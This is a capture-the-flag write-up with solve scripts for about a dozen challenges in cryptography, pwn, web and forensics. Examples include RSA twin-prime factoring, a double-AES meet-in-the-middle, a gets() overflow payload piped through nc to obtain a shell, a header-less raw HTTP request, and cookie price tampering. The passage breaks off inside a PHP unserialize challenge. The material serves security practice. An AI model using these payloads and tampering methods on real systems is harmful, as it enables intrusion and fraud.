# Let's do CTF
## Twins
Rem and Ram are twins, so of course, they're using twin primes when generating the public key.

output.txt:
```
N = 28265512785148668054687043164424479693022518403222612488086445701689124273153696780242227509530772578907204832839238806308349909883785833919803783017981782039457779890719524768882538916689390586069021017913449495843389734501636869534811161705302909526091341688003633952946690251723141803504236229676764434381120627728396492933432532477394686210236237307487092128430901017076078672141054391434391221235250617521040574175917928908260464932759768756492640542972712185979573153310617473732689834823878693765091574573705645787115368785993218863613417526550074647279387964173517578542035975778346299436470983976879797185599
e = 65537
C = 1234497647123308288391904075072934244007064896189041550178095227267495162612272877152882163571742252626259268589864910102423177510178752163223221459996160714504197888681222151502228992956903455786043319950053003932870663183361471018529120546317847198631213528937107950028181726193828290348098644533807726842037434372156999629613421312700151522193494400679327751356663646285177221717760901491000675090133898733612124353359435310509848314232331322850131928967606142771511767840453196223470254391920898879115092727661362178200356905669261193273062761808763579835188897788790062331610502780912517243068724827958000057923
```

chal.py:
```
from Crypto.Util.number import *
from secret import FLAG

def generate_twin_prime(N:int):
    while True:
        p = getPrime(N)
        if isPrime(p + 2): return p, p + 2


p, q = generate_twin_prime(1024)
N = p * q
e = 0x10001
m = bytes_to_long(FLAG)
C = pow(m, e, N)

print(f"{N = }")
print(f"{e = }")
print(f"{C = }")
```

Based on encryption logic `C = pow(m, e, N)` (where `m = bytes_to_long(FLAG)`),
the task is to recover `m` from `N, e, C`, i.e., recover the FLAG. Method: start from square root of `N` and derive `p` backwards.
```
from Crypto.Util.number import *
from math import isqrt

N = 28265512785148668054687043164424479693022518403222612488086445701689124273153696780242227509530772578907204832839238806308349909883785833919803783017981782039457779890719524768882538916689390586069021017913449495843389734501636869534811161705302909526091341688003633952946690251723141803504236229676764434381120627728396492933432532477394686210236237307487092128430901017076078672141054391434391221235250617521040574175917928908260464932759768756492640542972712185979573153310617473732689834823878693765091574573705645787115368785993218863613417526550074647279387964173517578542035975778346299436470983976879797185599
e = 65537
C = 1234497647123308288391904075072934244007064896189041550178095227267495162612272877152882163571742252626259268589864910102423177510178752163223221459996160714504197888681222151502228992956903455786043319950053003932870663183361471018529120546317847198631213528937107950028181726193828290348098644533807726842037434372156999629613421312700151522193494400679327751356663646285177221717760901491000675090133898733612124353359435310509848314232331322850131928967606142771511767840453196223470254391920898879115092727661362178200356905669261193273062761808763579835188897788790062331610502780912517243068724827958000057923

# Recover p and q
p = isqrt(N - 1)
while p * (p + 2) != N:
    p -= 1
q = p + 2

# Private key d
phi = (p - 1) * (q - 1)
d = inverse(e, phi)

# Decrypt
m = pow(C, d, N)
flag = long_to_bytes(m)

print(flag.decode())
```
**Flag: THJCC{7wIn_pR!me$_4RE_Too_L0VE1Y}**

## Frequency Freakout
cypher.txt:
```
MW RUB LGSEC GN TEYDDMTYE TSZJRGASYJUZ, IYWZ BWRUFDMYDRD XBAMW LMRU DMIJEB DFXDRMRFRMGW TMJUBSD. RUBDB XYDMT RBTUWMHFBD CBIGWDRSYRB RUB VFEWBSYXMEMRZ GN EBRRBS NSBHFBWTZ YWC DUGL UGL TBSRYMW JYRRBSWD TYW SBVBYE UMCCBW IBDDYABD.

GWB GN RUB IGDR BPTMRMWA BPBSTMDBD MW EBYSWMWA YXGFR TMJUBSD MD RSZMWA RG TGWDRSFTR ZGFS GLW YWC TUYEEBWAB GRUBSD RG XSBYQ MR. LUMEB IGCBSW BWTSZJRMGW IBRUGCD UYVB NYS DFSJYDDBC RUBDB RBTUWMHFBD MW TGIJEBPMRZ YWC DRSBWARU, RUB NFWCYIBWRYE MCBYD SBIYMW NYDTMWYRMWA.

MN ZGF'SB FJ NGS Y JFOOEB, UBSB'D Y TUYEEBWAB: RUKTT{DFXDR1R1GW_TMJU3S_1D_TGG1} -K RUMD IMAUR EGGQ EMQB Y SYWCGI DRSMWA, XFR MR'D WGR. UMCCBW LMRUMW RUMD DBHFBWTB MD RUB QBZ RG FWCBSDRYWCMWA UGL DMIJEB EBRRBS DFXDRMRFRMGW TYW DRMEE DJYSQ TFSMGDMRZ YWC NFW.

RSZ CBTGCMWA MR GS BIXBCCMWA MR LMRUMW ZGFS GLW TMJUBS. LUG QWGLD? ZGF IMAUR KFDR MWDJMSB DGIBGWB BEDB RG CMVB MWRG RUB LGSEC GN TSZJRYWYEZDMD.
```
Hint: substitution
From the hint, this ciphertext appears to use a **Substitution Cipher**, likely **Monoalphabetic Substitution**. This type is common in CTFs and can be seen as a Caesar-style variant/simple substitution.
Use [quipqiup](https://quipqiup.com/) to solve it.

**Flag: THJCC{SUBST1T1ON_CIPH3R_1S_COO1}**

## DAES
chal.py:
```
#!/usr/bin/python3
from Crypto.Cipher import AES
from secret import FLAG
import random
import os
import signal

TIMEOUT = 120

def timeout_handler(signum, frame):
    print("\nTime's up! No flag for u...")
    exit()

signal.signal(signal.SIGALRM, timeout_handler)
signal.alarm(TIMEOUT)

target = os.urandom(16)

keys = [b'whalekey:' + str(random.randrange(1000000, 1999999)).encode() for _ in range(2)]

def enc(key, msg):
    ecb = AES.new(key, AES.MODE_ECB)
    return ecb.encrypt(msg)

def daes(msg):
    tmp = enc(keys[0], msg)
    return enc(keys[1], tmp)

test = b'you are my fire~'
print(daes(test).hex())
print(daes(target).hex())

ans = input("Ans:")

if ans == target.hex():
    print(FLAG)
else:
    print("Nah, no flag for u...")

signal.alarm(0)
```
This challenge uses double AES encryption and tests ciphertext inversion. Main flow:
1. Randomly generate a 16-byte target plaintext
2. Encrypt twice with AES-ECB using two random keys (double encryption)
3. Show double-encrypted outputs of a known test string and target
4. Ask for the original plaintext of target

So first run in terminal:
```
(base) kql@Kclins-MacBook-Air ~ % nc chal.ctf.scint.org 12003
8c03e8360e9b753a4b07a02d5c4f5624
efa87975b86e8e6c8911199b140f047f
```
After obtaining the two random keys, run the following Python code
```
from Crypto.Cipher import AES
from itertools import product
import random

# Replace these two values with what the challenge outputs
daes_test_hex = '8c03e8360e9b753a4b07a02d5c4f5624'
daes_target_hex = 'efa87975b86e8e6c8911199b140f047f'

# --- Known plaintext ---
test_plain = b'you are my fire~'

# --- Key range ---
# key = b'whalekey:' + str(num), with num in 1000000 ~ 1999999
def gen_key(num):
    return b'whalekey:' + str(num).encode()

# --- AES ECB Encrypt ---
def enc(key, msg):
    return AES.new(key, AES.MODE_ECB).encrypt(msg)

# --- AES ECB Decrypt ---
def dec(key, msg):
    return AES.new(key, AES.MODE_ECB).decrypt(msg)

# --- Stage 1: forward mapping ---
print('[*] Building forward table...')
forward_table = {}
for num in range(1000000, 2000000):
    k1 = gen_key(num)
    try:
        mid = enc(k1, test_plain)
        forward_table[mid] = k1
    except:
        continue

# --- Stage 2: backward matching ---
print('[*] Searching for key pair...')
daes_test_bytes = bytes.fromhex(daes_test_hex)

for num in range(1000000, 2000000):
    k2 = gen_key(num)
    try:
        mid = dec(k2, daes_test_bytes)
        if mid in forward_table:
            k1 = forward_table[mid]
            print(f'[+] Found keys:')
            print(f'    key1 = {k1}')
            print(f'    key2 = {k2}')
            
            # Use the keys to decrypt daes(target)
            target_cipher = bytes.fromhex(daes_target_hex)
            mid2 = dec(k2, target_cipher)
            target_plain = dec(k1, mid2)
            print(f'[+] Original target plaintext (hex): {target_plain.hex()}')
            print(f'[+] Original target plaintext (bytes): {target_plain}')
            break
    except:
        continue
```
Then we get Original target plaintext (hex): c84db0b50cfb69abd5382542312b8d7a
Submit it as Ans to get the flag
```
Ans:c84db0b50cfb69abd5382542312b8d7a
THJCC{see_u_again_in_the_middle}
```

## Snake
chal.py:
```
SSSSS = input()
print("".join(["!@#$%^&*(){}[]:;"[int(x, 2)] for x in [''.join(f"{ord(c):08b}" for c in SSSSS)[i:i+4] for i in range(0, len(SSSSS) * 8, 4)]]))
```
output.txt:
```
^$&:&@&}&^*$#!&@*#&^#!&^&[&;&:&*&@*%&^&%#!&[&)&]&#&[&^*$*$#!*#&^*!*%&)&[&^*$#!&;&&#!*%&(&^#!*$*^&#&;*#&%&^*##!^$&^*#*!&^&:*%&^*$#:#!%$&[&@&%&)*$*%&)&$&@&[&[*)#!*$*@*^&@&]&@*%&^*$#[#!*$&:&@&}&^*$#!&@*#&^#!&^&$*%&;*%&(&^*#&]&)&$#[#!&@&]&:&)&;*%&^#!*&&^*#*%&^&#*#&@*%&^*$#!&$&;*&&^*#&^&%#!&)&:#!&;*&&^*#&[&@*!*!&)&:&*#!*$&$&@&[&^*$#!&]*^&$&(#!&[&)&}&^#!&;*%&(&^*##!&]&^&]&#&^*#*$#!&;&&#!*%&(&^#!&**#&;*^*!#:#!%]&@&:*)#!*$*!&^&$&)&^*$#!&;&&#!*$&:&@&}&^*$#!&(&@*&&^#!*$&}*^&[&[*$#!**&)*%&(#!*$&^*&&^*#&@&[#!&]&;*#&^#!&{&;&)&:*%*$#!*%&(&@&:#!*%&(&^&)*##!&[&)*{&@*#&%#!&@&:&$&^*$*%&;*#*$#!&@&:&%#!*#&^&[&@*%&)*&&^*$#[#!&^&:&@&#&[&)&:&*#!*%&(&^&]#!*%&;#!*$**&@&[&[&;**#!*!*#&^*)#!&]*^&$&(#!&[&@*#&*&^*##!*%&(&@&:#!*%&(&^&)*##!&(&^&@&%*$#!#(&$*#&@&:&)&@&[#!&}&)&:&^*$&)*$#)#:#!^%&;#!&@&$&$&;&]&]&;&%&@*%&^#!*%&(&^&)*##!&:&@*#*#&;**#!&#&;&%&)&^*$#[#!*$&:&@&}&^*$#*#!*!&@&)*#&^&%#!&;*#&*&@&:*$#!#(*$*^&$&(#!&@*$#!&}&)&%&:&^*)*$#)#!&@*!*!&^&@*##!&;&:&^#!&)&:#!&&*#&;&:*%#!&;&&#!*%&(&^#!&;*%&(&^*##!&)&:*$*%&^&@&%#!&;&&#!*$&)&%&^#!&#*)#!*$&)&%&^#[#!&@&:&%#!&]&;*$*%#!&;&:&[*)#!&(&@*&&^#!&;&:&^#!&&*^&:&$*%&)&;&:&@&[#!&[*^&:&*#:#!^$&;&]&^#!*$*!&^&$&)&^*$#!*#&^*%&@&)&:#!&@#!*!&^&[*&&)&$#!&*&)*#&%&[&^#!**&)*%&(#!&@#!*!&@&)*##!&;&&#!*&&^*$*%&)&*&)&@&[#!&$&[&@***$#!&;&:#!&^&)*%&(&^*##!*$&)&%&^#!&;&&#!*%&(&^#!&$&[&;&@&$&@#:#!%[&)*{&@*#&%*$#!&(&@*&&^#!&)&:&%&^*!&^&:&%&^&:*%&[*)#!&^*&&;&[*&&^&%#!&^&[&;&:&*&@*%&^#!&#&;&%&)&^*$#!**&)*%&(&;*^*%#!&[&)&]&#*$#!&;*##!**&)*%&(#!&**#&^&@*%&[*)#!*#&^&%*^&$&^&%#!&[&)&]&#*$#!&@*%#!&[&^&@*$*%#!*%**&^&:*%*)#]&&&)*&&^#!*%&)&]&^*$#!*&&)&@#!&$&;&:*&&^*#&*&^&:*%#!&^*&&;&[*^*%&)&;&:#[#!&[&^&@&%&)&:&*#!*%&;#!&]&@&:*)#!&[&)&:&^&@&*&^*$#!&;&&#!&[&^&*&[&^*$*$#!&[&)*{&@*#&%*$#:#!^%&(&^*$&^#!*#&^*$&^&]&#&[&^#!*$&:&@&}&^*$#[#!&#*^*%#!*$&^*&&^*#&@&[#!&$&;&]&]&;&:#!&**#&;*^*!*$#!&;&&#!&[&^&*&[&^*$*$#!&[&)*{&@*#&%*$#!&(&@*&&^#!&^*)&^&[&)&%*$#!&@&:&%#!&^*(*%&^*#&:&@&[#!&^&@*#*$#[#!**&(&)&$&(#!*$&:&@&}&^*$#!&[&@&$&}#[#!&@&[*%&(&;*^&*&(#!*%&(&)*$#!*#*^&[&^#!&)*$#!&:&;*%#!*^&:&)*&&^*#*$&@&[#!#(*$&^&^#!%@&]*!&(&)*$&#&@&^&:&)&@#[#!%%&)&#&@&]&)&%&@&^#[#!&@&:&%#!^!*)&*&;*!&;&%&)&%&@&^#)#:#!&#&[&@&#&[&@&#&[&@#!%(&^*#&^#!&)*$#!*)&;*^*##!&&&[&@&*${#!^%%(%{%$%$*}^$%:%@%}$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$*]
```
Hint: what does the snake say?

`chal.py` behavior:
1. Convert input string into an 8-bit binary stream
```
''.join(f"{ord(c):08b}" for c in SSSSS)
```
2. Split binary stream into 4-bit chunks (nibbles)
```
[i:i+4 for i in range(0, len(SSSSS) * 8, 4)]
```
3. Treat each 4-bit chunk as an integer index for lookup
```
index:  0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15
char :  ! @ # $ % ^ & * ( )  {   }  [  ]  :  ;
```
So the key is a 4-bit-per-char mapping encoding. We need to decode `output.txt` to recover the original input (the flag).

Run this Python code
```
charset = "!@#$%^&*(){}[]:;"
encoded = "^$&:&@&}&^*$#!&@*#&^#!&^&[&;&:&*&@*%&^&%#!&[&)&]&#&[&^*$*$#!*#&^*!*%&)&[&^*$#!&;&&#!*%&(&^#!*$*^&#&;*#&%&^*##!^$&^*#*!&^&:*%&^*$#:#!%$&[&@&%&)*$*%&)&$&@&[&[*)#!*$*@*^&@&]&@*%&^*$#[#!*$&:&@&}&^*$#!&@*#&^#!&^&$*%&;*%&(&^*#&]&)&$#[#!&@&]&:&)&;*%&^#!*&&^*#*%&^&#*#&@*%&^*$#!&$&;*&&^*#&^&%#!&)&:#!&;*&&^*#&[&@*!*!&)&:&*#!*$&$&@&[&^*$#!&]*^&$&(#!&[&)&}&^#!&;*%&(&^*##!&]&^&]&#&^*#*$#!&;&&#!*%&(&^#!&**#&;*^*!#:#!%]&@&:*)#!*$*!&^&$&)&^*$#!&;&&#!*$&:&@&}&^*$#!&(&@*&&^#!*$&}*^&[&[*$#!**&)*%&(#!*$&^*&&^*#&@&[#!&]&;*#&^#!&{&;&)&:*%*$#!*%&(&@&:#!*%&(&^&)*##!&[&)*{&@*#&%#!&@&:&$&^*$*%&;*#*$#!&@&:&%#!*#&^&[&@*%&)*&&^*$#[#!&^&:&@&#&[&)&:&*#!*%&(&^&]#!*%&;#!*$**&@&[&[&;**#!*!*#&^*)#!&]*^&$&(#!&[&@*#&*&^*##!*%&(&@&:#!*%&(&^&)*##!&(&^&@&%*$#!#(&$*#&@&:&)&@&[#!&}&)&:&^*$&)*$#)#:#!^%&;#!&@&$&$&;&]&]&;&%&@*%&^#!*%&(&^&)*##!&:&@*#*#&;**#!&#&;&%&)&^*$#[#!*$&:&@&}&^*$#*#!*!&@&)*#&^&%#!&;*#&*&@&:*$#!#(*$*^&$&(#!&@*$#!&}&)&%&:&^*)*$#)#!&@*!*!&^&@*##!&;&:&^#!&)&:#!&&*#&;&:*%#!&;&&#!*%&(&^#!&;*%&(&^*##!&)&:*$*%&^&@&%#!&;&&#!*$&)&%&^#!&#*)#!*$&)&%&^#[#!&@&:&%#!&]&;*$*%#!&;&:&[*)#!&(&@*&&^#!&;&:&^#!&&*^&:&$*%&)&;&:&@&[#!&[*^&:&*#:#!^$&;&]&^#!*$*!&^&$&)&^*$#!*#&^*%&@&)&:#!&@#!*!&^&[*&&)&$#!&*&)*#&%&[&^#!**&)*%&(#!&@#!*!&@&)*##!&;&&#!*&&^*$*%&)&*&)&@&[#!&$&[&@***$#!&;&:#!&^&)*%&(&^*##!*$&)&%&^#!&;&&#!*%&(&^#!&$&[&;&@&$&@#:#!%[&)*{&@*#&%*$#!&(&@*&&^#!&)&:&%&^*!&^&:&%&^&:*%&[*)#!&^*&&;&[*&&^&%#!&^&[&;&:&*&@*%&^#!&#&;&%&)&^*$#!**&)*%&(&;*^*%#!&[&)&]&#*$#!&;*##!**&)*%&(#!&**#&^&@*%&[*)#!*#&^&%*^&$&^&%#!&[&)&]&#*$#!&@*%#!&[&^&@*$*%#!*%**&^&:*%*)#]&&&)*&&^#!*%&)&]&^*$#!*&&)&@#!&$&;&:*&&^*#&*&^&:*%#!&^*&&;&[*^*%&)&;&:#[#!&[&^&@&%&)&:&*#!*%&;#!&]&@&:*)#!&[&)&:&^&@&*&^*$#!&;&&#!&[&^&*&[&^*$*$#!&[&)*{&@*#&%*$#:#!^%&(&^*$&^#!*#&^*$&^&]&#&[&^#!*$&:&@&}&^*$#[#!&#*^*%#!*$&^*&&^*#&@&[#!&$&;&]&]&;&:#!&**#&;*^*!*$#!&;&&#!&[&^&*&[&^*$*$#!&[&)*{&@*#&%*$#!&(&@*&&^#!&^*)&^&[&)&%*$#!&@&:&%#!&^*(*%&^*#&:&@&[#!&^&@*#*$#[#!**&(&)&$&(#!*$&:&@&}&^*$#!&[&@&$&}#[#!&@&[*%&(&;*^&*&(#!*%&(&)*$#!*#*^&[&^#!&)*$#!&:&;*%#!*^&:&)*&&^*#*$&@&[#!#(*$&^&^#!%@&]*!&(&)*$&#&@&^&:&)&@#[#!%%&)&#&@&]&)&%&@&^#[#!&@&:&%#!^!*)&*&;*!&;&%&)&%&@&^#)#:#!&#&[&@&#&[&@&#&[&@#!%(&^*#&^#!&)*$#!*)&;*^*##!&&&[&@&*${#!^%%(%{%$%$*}^$%:%@%}$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$*]"

bin_str = ''
for c in encoded:
    try:
        index = charset.index(c)
        bin_str += f"{index:04b}"  # convert each back to 4-bit binary
    except ValueError:
        print(f"Error: Character '{c}' not found in charset.")
        # Handle the error appropriately, e.g., skip the character, exit, or replace it
        continue #Skip the invalid character in encoded string.

# Convert every 8 bits back to a character
flag = ''.join(chr(int(bin_str[i:i+8], 2)) for i in range(0, len(bin_str), 8))
print("Decoded result:", flag)
```
**Flag: THJCC{SNAK3333333333333333}**

## Money Overflow
chal.c:
```
#include<stdio.h>
#include<stdlib.h>

void init()
{
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stdin, 0, 2, 0);
}

struct
{
    int id;
    char name[20];
    unsigned short money;
} customer;

void shop(int choice)
{
    switch(choice)
    {
        case 1:
            if (customer.money >= 100)
            {
                customer.money -= 100;
                printf("Here is your cake: %s", "🍰\n");
            }
            else 
                printf("Not enough money QQ\n");
            break;
        case 2:
            if (customer.money >= 50)
            {
                customer.money -= 50;
                printf("Here is your bun: %s", "🥖\n");
            }
            else 
                printf("Not enough money QQ\n");
            break;
        case 3:
            if (customer.money >= 25)
            {
                customer.money -= 25;
                printf("Here is your cookie: %s", "🍪\n");
            }
            else 
                printf("Not enough money QQ\n");
            break;
        case 4:
            if (customer.money >= 10)
            {
                customer.money -= 10;
                printf("Here is your water: %s", "💧\n");
            }
            else 
                printf("Not enough money QQ\n");
            break;
        case 5:
            if (customer.money >= 65535)
            {
                system("/bin/sh");
                exit(0);
            }
            else 
                printf("Not enough money QQ\n");
            break;
        default:
            printf("Not an available choice\n");
            break;
    }
    if (customer.money <= 0)
    {
        printf("No money QQ\n");
        exit(0);
    }
}

void main()
{
    init();
    customer.id = 1;
    customer.money = 100;
    printf("Enter your name: ");
    gets(customer.name);
    int choice; 
    while (1)
    {
        printf("1) cake 100$\n");
        printf("2) bun 50$\n");
        printf("3) cookie 25$\n");
        printf("4) water 15$\n");
        printf("5) get shell 65535$\n");
        printf("Your money : %d$\n", customer.money);
        printf("Buy > ");
        scanf("%d", &choice);
        shop(choice);
    }
}
```
The program uses `gets()` to read customer name, which is vulnerable to buffer overflow because it does not check input length. The `customer` struct layout is:
1. id (integer)
2. name (20-byte char array)
3. money (unsigned short, 2 bytes)

Goal is option 5 for shell, requiring 65535 dollars, but initial money is only 100.
First create a Python script to generate payload.
```
import struct

# Create payload: 20 'A's + little-endian 0xFFFF (65535)
payload = b'A' * 20 + struct.pack('<H', 0xffff)

# Write result to file
with open('payload.bin', 'wb') as f:
    f.write(payload)
    # Add option 5 selection
    f.write(b'\n5\n')

print("payload.bin created")
```
Then run the script. Since `cat payload.bin | nc ...` loops interaction endlessly, use `(cat payload.bin; cat) | nc chal.ctf.scint.org 10001`.
After that you can buy shell and run `ls -la`
```
(base) kql@Kclins-MacBook-Air Desktop % (cat payload.bin; cat) | nc chal.ctf.scint.org 10001
Enter your name: 1) cake 100$
2) bun 50$
3) cookie 25$
4) water 15$
5) get shell 65535$
Your money : 65535$
Buy > 5
ls -la
total 72
drwxr-xr-x    1 root root 4096 Feb 18 07:28 .
drwxr-xr-x    1 root root 4096 Feb 18 07:28 ..
-rwxr-xr-x    1 root root    0 Feb 18 07:28 .dockerenv
lrwxrwxrwx    1 root root    7 Jan 26 02:05 bin -> usr/bin
drwxr-xr-x    2 root root 4096 Apr 18  2022 boot
drwxr-xr-x    5 root root  340 Feb 18 07:28 dev
drwxr-xr-x    1 root root 4096 Feb 18 07:28 etc
-rwxrwxrwx    1 chal chal   48 Jan 29 15:11 flag.txt
drwxr-xr-x    1 root root 4096 Feb 17 12:05 home
lrwxrwxrwx    1 root root    7 Jan 26 02:05 lib -> usr/lib
lrwxrwxrwx    1 root root    9 Jan 26 02:05 lib32 -> usr/lib32
lrwxrwxrwx    1 root root    9 Jan 26 02:05 lib64 -> usr/lib64
lrwxrwxrwx    1 root root   10 Jan 26 02:05 libx32 -> usr/libx32
drwxr-xr-x    2 root root 4096 Jan 26 02:05 media
drwxr-xr-x    2 root root 4096 Jan 26 02:05 mnt
drwxr-xr-x    2 root root 4096 Jan 26 02:05 opt
dr-xr-xr-x 1053 root root    0 Feb 18 07:28 proc
drwx------    2 root root 4096 Jan 26 02:13 root
drwxr-xr-x    5 root root 4096 Jan 26 02:13 run
lrwxrwxrwx    1 root root    8 Jan 26 02:05 sbin -> usr/sbin
drwxr-xr-x    2 root root 4096 Jan 26 02:05 srv
dr-xr-xr-x   13 root root    0 Feb 18 07:28 sys
drwxrwxrwt    1 root root 4096 Feb 17 12:05 tmp
drwxr-xr-x    1 root root 4096 Jan 26 02:05 usr
drwxr-xr-x    1 root root 4096 Jan 26 02:13 var
```
Found `flag.txt`
**Flag: THJCC{Y0uR_n@mE_I$_ToO_LoO0OOO00oO0000o0O00OoNG}**

## Headless
Hint: I think robots are headless, but you are a real human, right?
Check `robots.txt` and find:
```
User-Agent: *
Disallow: /hum4n-0nLy
```
Visit the disallowed path: `/hum4n-0nLy`
Run:
```
curl -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36" http://chal.ctf.scint.org:10069/hum4n-0nLy
```
It shows:
```
from flask import Flask, request, render_template, Response
from flag import FLAG
app = Flask(name)

@app.route('/')
def index():
    return render_template('index.html')
@app.route('/robots.txt')
def noindex():
    r = Response(response="User-Agent: *\nDisallow: /hum4n-0nLy\n", status=200, mimetype="text/plain")
    r.headers["Content-Type"] = "text/plain; charset=utf-8"
    return r

@app.route('/hum4n-0nLy')
def source_code():
    return open(file).read()

@app.route('/r0b07-0Nly-9e925dc2d11970c33393990e93664e9d')
def secret_flag():
    if len(request.headers) > 1:
        return "I'm sure robots are headless, but you are not a robot, right?"
    return FLAG
    
if name == 'main':
    app.run(host='0.0.0.0',port=80,debug=False）
```
Found hidden path `/r0b07-0Nly-9e925dc2d11970c33393990e93664e9d`

Run another command
```
(echo -e "GET /r0b07-0Nly-9e925dc2d11970c33393990e93664e9d HTTP/1.0\r\n\r\n"; sleep 1) | nc chal.ctf.scint.org 10069
```
This command is meant to bypass the header check in source code:
1. GET specifies the resource request
2. HTTP/1.0 is the protocol version; HTTP/1.1 requires a Host header
HTTP/1.0 does not require Host, allowing a zero-header request
3. `\r\n\r\n` ends HTTP headers and starts body
4. `sleep 1` keeps connection open for server processing
5. `nc` creates raw TCP connection to server
Pipe the echoed HTTP request into that connection

This sends a request without extra HTTP headers, satisfying the source condition and returning the flag instead of error. Normal HTTP clients auto-add headers, so low-level control is needed.

Response returns the flag
```
HTTP/1.1 200 OK
Server: nginx/1.23.2
Date: Sun, 20 Apr 2025 07:57:23 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 33
Connection: close

THJCC{Rob0t_r=@lways_he@dl3ss...}
```

## West

Hint: C language Chinese version

chal.c: 
```
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#define CH char
#define encrypted_flag enrypted_flag
#define EQ =
#define VOID void
#define decrypt_fn decrypt
#define INT int
#define LT <
#define NVAR n
#define FOR for
#define IVAR i
#define INC ++
#define ZERO 0
#define XOREQ ^=
#define XKEY 0xF5
#define MAIN main
#define IFKW if
#define STRLEN strlen
#define PRINTF printf
#define FMTS "%s"
CH encrypted_flag[] EQ "\xa1\xbd\xbf\xb6\xb6\x8e\xa1\x9d\xc4\x86\xaa\xc4\xa6\xaa\x9b\xc5\xa1\xaa\x9a\x97\x93\xa0\xd1\x96\xb5\xa1\xc4\xba\x9b\x88";

VOID decrypt_fn(INT NVAR)
{
    FOR (INT IVAR EQ ZERO; IVAR LT NVAR; IVAR INC)
    {
        encrypted_flag[IVAR] XOREQ XKEY;
    }
}

INT MAIN()
{
    IFKW (ZERO)
    {
        decrypt_fn(STRLEN(encrypted_flag));
    }
    PRINTF(FMTS, encrypted_flag);
}
```
So the equivalent code is
```
import binascii

# Encrypted flag as given in the C code
encrypted_flag = b"\xa1\xbd\xbf\xb6\xb6\x8e\xa1\x9d\xc4\x86\xaa\xc4\xa6\xaa\x9b\xc5\xa1\xaa\x9a\x97\x93\xa0\xd1\x96\xb5\xa1\xc4\xba\x9b\x88"

# Decrypt by XOR-ing each byte with 0xF5
decoded_flag = bytes(b ^ 0xF5 for b in encrypted_flag)

# Display the decrypted flag
print(decoded_flag.decode())
```
**Flag: THJCC{Th1s_1S_n0T_obfU$c@T1On}**

## APPL3 STOR3🍎

Find hidden page `http://chal.ctf.scint.org:8787/items?id=87`
Cannot afford flag, so modify Cookie `Product_Prices` value to 0

**Flag: THJCC{Appl3_st0r3_M45t3r}**

## Seems like someone’s breaking down😂

Hint: STOP ATTACK MeEeeEeEEeeE Hey you! come here! Help me to find out WHO break my door!

Download provided `app.log`; it contains huge login records, so first scan for keywords
```
grep -Ei 'break|door|alarm|unauthorized' app.log
```
Still too much data, so filter further
```
grep '172.18.0.1' app.log | grep -v '404' | grep -E 'unlock|admin|door'
```
One line has a suspicious password; decode it with base64

**Flag: THJCC{L0g_F0r3N51C5_1s_E45Y}**

## Python Hunter 🐍

Hint: Let’s catch python together!
First decompile provided `hunter.cpython-38.pyc` into Python file
```
uncompyle6 hunter.cpython-38.pyc > hunter.py
```
hunter.py:
```
# uncompyle6 version 3.9.2
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.11.5 (main, Sep 11 2023, 08:17:37) [Clang 14.0.6 ]
# Embedded file name: hunter.py
# Compiled at: 2025-03-24 19:52:35
# Size of source mod 2**32: 655 bytes
import sys as s

def qwe(abc, xyz):
    r = []
    l = len(xyz)
    for i in range(len(abc)):
        t = chr(abc[i] ^ ord(xyz[i % l]))
        r.append(t)
    else:
        return "".join(r)


d = [48, 39, 37, 49, 28, 16, 82, 17, 87, 13, 92, 71, 104, 52, 21, 0, 83, 
 7, 95, 28, 55, 30, 11, 78, 87, 29, 18]
k = "door_key"
m = "not_a_key"

def asd(p):
    u = 42
    v = qwe(d, k)
    w = qwe(d, p)
    if w == v:
        print(f"Correct! {v}")
    else:
        print("Wrong!")


def dummy():
    return len(d) * 2 - 1


if __name__ == "__main__":
    if len(s.argv) > 1:
        asd(s.argv[1])
    else:
        print("Please provide a key as an argument.")
    dummy()

# okay decompiling hunter.cpython-38.pyc
```
Core logic (`def qwe(abc, xyz):`) is an XOR decryptor: decrypt ciphertext `abc` (array `d`) with key `xyz`. `v = qwe(d, k)` uses `door_key` to decrypt `d`, giving the correct flag.
```
d = [48, 39, 37, 49, 28, 16, 82, 17, 87, 13, 92, 71, 104, 52, 21, 0, 83, 
     7, 95, 28, 55, 30, 11, 78, 87, 29, 18]
k = "door_key"

def qwe(abc, xyz):
    r = []
    l = len(xyz)
    for i in range(len(abc)):
        t = chr(abc[i] ^ ord(xyz[i % l]))
        r.append(t)
    return "".join(r)

flag = qwe(d, k)
print("Flag:", flag)
```
**Flag: THJCC{7h3b357_py7h0nhun73r}**

## Lime Ranger

Page source:
```
<?php 
session_start();

if(isset($_GET["view"])){
    show_source(__FILE__);
    exit();
}

include "flag.php";

if(!isset($_SESSION["balance"])){
    $_SESSION["balance"] = 4000;
    $_SESSION["inventory"] = array("UR" => 0, "SSR" => 0, "SR" => 0, "R" => 0, "N" => 0);
}

if(isset($_GET["bonus_code"])){
    $code = $_GET["bonus_code"];
    $new_inv = @unserialize($code);
    if(is_array($new_inv)){
        foreach($new_inv as $key => $value){
            if(isset($_SESSION["inventory"][$key]) && is_numeric($value)){
                $_SESSION["inventory"][$key] += $value;
            }
        }
    }
}

if(isset($_GET["sellacc"])){
    if($_SESSION["inventory"]["UR"] + $_SESSION["inventory"]["SSR"] >= 10){
        exit("$flag");
    } else {
        exit('Your account is not valuable!');
    }
}

$draw_result = "";
if(isset($_GET["draw1"])){
    if($_SESSION["balance"] < 40){
        $draw_result = "Not enough gems!";
    } else {
        $_SESSION["balance"] -= 40;
        $draw_result = "Congratulations, you got: " . implode(", ", draw(1));
    }
} elseif(isset($_GET["draw10"])){
    if($_SESSION["balance"] < 200){
        $draw_result = "Not enough gems!";
    } else {
        $_SESSION["balance"] -= 200;
        $draw_result = "Congratulations, you got: " . implode(", ", draw(6));
    }
}

function draw($n){
    $out = [];
    for($i = 1; $i <= $n; $i++){
        $r = lcg_value();
        $out[] = lookup($r);
    }
    return $out;
}

function lookup($r){
    if($r <= 0.001){
        $_SESSION["inventory"]["UR"] += 1;
        return "UR Ultra Rare";
    } elseif($r <= 0.004){
        $_SESSION["inventory"]["SSR"] += 1;
        return "SSR Super Rare";
    } elseif($r <= 0.009){
        $_SESSION["inventory"]["SR"] += 1;
        return "SR Rare";
    } elseif($r <= 0.016){
        $_SESSION["inventory"]["R"] += 1;
        return "R Advanced";
    } else {
